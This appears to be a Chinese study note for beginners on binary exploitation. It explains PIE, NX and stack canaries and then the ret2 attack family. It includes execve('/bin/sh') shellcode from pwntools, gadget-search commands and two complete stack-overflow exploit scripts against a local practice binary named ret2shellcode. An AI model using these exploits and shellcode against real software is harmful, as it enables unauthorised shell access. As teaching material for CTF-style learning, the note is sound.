# PWN 入门：ret2 系列攻击手法学习笔记

---

## 一、编译器保护机制概述

在了解攻击手法之前，需要先理解编译器开启的保护措施。这些保护措施直接影响我们可以使用的攻击方式。

### 1. PIE（Position Independent Executable）

内存中最重要的一个概念就是**地址**，类似门牌号，只有拿着正确的地址才能找到正确的数据。

在二进制漏洞利用过程中，地址是很重要的一个参量。例如内存中某个位置存在有价值的数据，如果想要泄漏这些数据，就必须得到正确的内存地址。

- **未开启 PIE**：程序会被加载到一个固定的地址上，根据固定地址加上偏移量即可得到有效地址，偏移量通常可以通过逆向手段确定。
    
- **开启 PIE**：程序会被胡乱加载到内存随机的位置，这个位置只有操作系统才知道。攻击者想要定位内存数据就比较困难了。
    

### 2. NX（No-eXecute）

内存中另外一个重要概念就是**分段和分页**。由于分段的特性，一个程序在内存中可分为代码段、数据段等，类似于 Linux 中的文件权限，每个段拥有不同的权限。可简单分为：

|权限|含义|
|---|---|
|R（Read）|可读取|
|W（Write）|可否写|
|X（Execute）|可否执行|

只有拥有**可执行权限**的段中的内容才能被 CPU 执行。当系统监测到从不可执行段上获取指令的操作时，就会结束当前进程。

**NX 就是这样一种技术**：通过修改段的权限设置，将没有必要的权限移除。例如数据段不需要可执行权限、代码段不需要可写权限等，如此攻击者就不能胡乱劫持程序执行流，或者修改已经存在的代码了。

> **PS**：相当于给每个段发员工卡，你只能做分内的事。

### 3. Canary（金丝雀）

Canary 字面意思是金丝雀，这里有一个典故。据说煤矿工人在下井之前要准备一只金丝雀，用于探测地下一氧化碳是否超标。这种习惯甚至形成了一句英文短语：_canary in a coal mine_，类似于中文里的"预警"。

编译器也引入了一个名为 **canary** 的保护措施，其作用也是预警。

在没有任何保护的情况下，一旦发生溢出，系统会完全暴露在风险之下。而 canary 就是在 **ebp 的位置上方**插入了一条独特的数据，这个数据是**不可预测**的。在执行某些重要操作之前会首先检查这个数据有没有被动，如果被改动了，进程会直接退出。这样就起到了对栈溢出的一种缓解作用。

```
栈布局示意：
┌──────────
│   ...... │
├──────────
│  Canary  │  ← 溢出时会先覆盖这里
├──────────┤
│   EBP    │
├──────────┤
│  返回地址  │
──────────┘
```

> **PS**：相当于雇佣一个放哨的，发现异常情况就通报。

## 二、ret2 系列攻击手法总览

ret2 系列攻击手法的产生，与上述缓解措施息息相关。

|序号|攻击手法|适用场景|
|---|---|---|
|1|ret2text|程序自身含有 system/execve 等函数|
|2|ret2shellcode|NX 未开启，栈可执行|
|3|ret2syscall|通过 syscall 指令直接调用系统调用|
|4|ret2libc|NX 开启，利用 libc 中的函数|
|5|ret2csu|64 位程序中利用 __libc_csu_init|
|6|栈迁移|栈空间不足时迁移到可控区域|
|7|SROP|利用 sigreturn 系统调用|

---

## 三、ret2text

### 原理

`.text` 是程序的代码段，所有可被 CPU 执行的机器码都位于 `.text` 段中。

所谓 **ret2text** 就是控制程序执行流返回到程序自身。实际情况是，某些程序中会用到 `system`、`execve` 等函数来执行系统命令。例如路由器的固件，常常需要使用 `execve` 来进行如防火墙、网站过滤等设置。而当其中某处发生栈溢出时，我们可以直接利用程序中自带的 `execve`、`system` 等函数获取 shell。

像这种控制执行流到程序自身的行为就叫做 **ret2text**，是最基本的 ROP 手法。

## 四、ret2shellcode

### 4.1 什么是 Shellcode

Shellcode 是一小段代码，可以用于软件漏洞利用的载荷。被称为"shellcode"是因为它通常启动一个命令终端，攻击者可以通过这个终端控制受害的计算机，但是所有执行类似任务的代码片段都可以称作 shellcode。Shellcode 通常是以**机器码**形式编写的。

一般通过编写汇编语言后将其编译得到所需的 shellcode。

### 4.2 Pwntools 中的 Shellcode

在 Pwntools 中，内置了一些 shellcode 与编译方式，只需要使用以下方式就可以调用：

```
from pwn import *

# 生成 amd64 架构的 shellcode
shellcode = shellcraft.amd64.sh()

# 对应的汇编代码：
# /* execve(path='/bin///sh', argv=['sh'], envp=0) */
# /* push b'/bin///sh\x00' */
# push 0x68
# mov rax, 0x732f2f2f6e69622f
# push rax
# mov rdi, rsp
# /* push argument array ['sh\x00'] */
# /* push b'sh\x00' */
# push 0x1010101 ^ 0x6873
# xor dword ptr [rsp], 0x1010101
# xor esi, esi  /* 0 */
# push rsi  /* null terminate */
# push 8
# pop rsi
# add rsi, rsp
# push rsi  /* 'sh\x00' */
# mov rsi, rsp
# xor edx, edx  /* 0 */
# /* call execve() */
# push SYS_execve  /* 0x3b */
# pop rax
# syscall
```

### 4.3 利用方式

根据函数调用约定，在一个函数执行的最后，是一个 `leave; ret;`，实质是：

```
mov esp, ebp
pop ebp
pop eip
```

这时候我们在填充一个 shellcode，然后控制返回地址为 `jmp esp` 即可利用。

**栈布局：**

```
──────────────┐  高地址
│   shellcode  │
├──────────────┤
│  jmp esp 地址 │  ← 覆盖返回地址
──────────────┤
│   old_ebp    │
├──────────────┤
│   局部变量    │
└──────────────┘  低地址
```

### 4.4 查找 jmp esp 地址

需要的就是一个 `jmp esp` 的地址。这里选择使用 **ROPgadget** 和 **ropper** 两个工具来查找。

**方法一：ROPgadget**

```
ROPgadget --binary ret2shellcode --only "jmp"
```

**方法二：ropper**

```
ropper --file ret2shellcode
# 进入交互模式后：
> search jmp
```

示例输出：

```
[INFO] File: ret2shellcode
0x080485f1: jmp dword ptr [ecx];
0x08048691: jmp esp;
```

### 4.5 最终 EXP

```
from pwn import *

s = process("./ret2shellcode")
context.arch = "i386"

jmp_esp = 0x08048691
gdb.attach(s, """
    b *0x08048598
    c
""")

payload = 'A' * 112 + p32(jmp_esp) + asm(shellcraft.sh())
s.sendlineafter("No system for you this time !!!", payload)
s.interactive()
```

### 4.6 另一种 EXP 写法（shellcode 前置）

```
from pwn import *

s = process("./ret2shellcode")
context.arch = 'i386'
gdb.attach(s, "b *0x080485C5\n")

shellcode = shellcraft.sh()
payload = asm(shellcode)                          # 先生成 shellcode
payload = payload.ljust(112, 'A') + p32(0x0804A080)  # 填充到 112 字节，再接 jmp_esp 地址
s.sendline(payload)

s.interactive()
```

> **说明**：这种写法将 shellcode 放在缓冲区起始位置，用 `'A'` 填充到溢出点，最后接 `jmp esp` 的地址。当函数返回时，`jmp esp` 跳转到栈顶，正好执行前面的 shellcode。

## 五、NX 开启时的应对：mprotect

### 5.1 问题

当 NX 开启后，栈段权限变为 **RW**（可读可写，不可执行），直接放 shellcode 到栈上无法执行。

### 5.2 mprotect 函数

```
int mprotect(void *addr, size_t len, int prot);
```

|参数|含义|
|---|---|
|`addr`|起始地址，必须对齐到页边界（通常 0x1000 的倍数）|
|`len`|修改的长度|
|`prot`|权限值：`PROT_READ\|PROT_WRITE\|PROT_EXEC` = **7**（可读可写可执行）|

### 5.3 利用思路

1. 利用 ROP 链调用 `mprotect(stack_addr, size, 7)`，将栈改为 **RWX**
    
2. 再次溢出，将 shellcode 放到栈上并跳转执行

## 六、保护机制与攻击手法对应关系

|保护组合|可用攻击手法|
|---|---|
|无保护|ret2shellcode（栈可执行，地址固定）|
|NX 开启|ret2libc / ROP / mprotect + ret2shellcode|
|PIE 开启|需先泄露地址（如通过 GOT 表泄露）|
|Canary 开启|需先泄露 canary 值（如通过格式化字符串漏洞）|
|NX + PIE + Canary|组合利用，难度最高|

## 八、常用 Pwntools 命令

from pwn import *

# 设置架构
context.arch = "i386"    # 32 位
context.arch = "amd64"   # 64 位

# 启动进程
s = process("./binary")

# GDB 调试
gdb.attach(s, "b *0x08048598\nc")

# 生成 shellcode
asm(shellcraft.sh())

# 发送 payload
s.sendline(payload)
s.sendlineafter("prompt", payload)

# 交互
s.interactive()

# 检查保护
checksec("./binary")
